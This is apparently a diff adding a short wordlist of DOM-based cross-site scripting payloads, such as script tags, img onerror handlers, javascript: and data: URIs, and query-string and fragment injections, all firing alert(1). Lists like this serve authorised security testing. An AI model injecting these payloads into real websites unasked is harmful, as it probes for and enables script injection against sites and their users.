@@ -1,0 +1,10 @@
+# XSS - DOM-Based Payloads
+#<script>alert(1)</script>
+#<img src=x onerror=alert(1)>
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+#"><img src=x onerror=alert(1)>
+?q=<script>alert(1)</script>
+?name=<img src=x onerror=alert(1)>
+?redirect=javascript:alert(1)
+#\u003cscript\u003ealert(1)\u003c/script\u003e
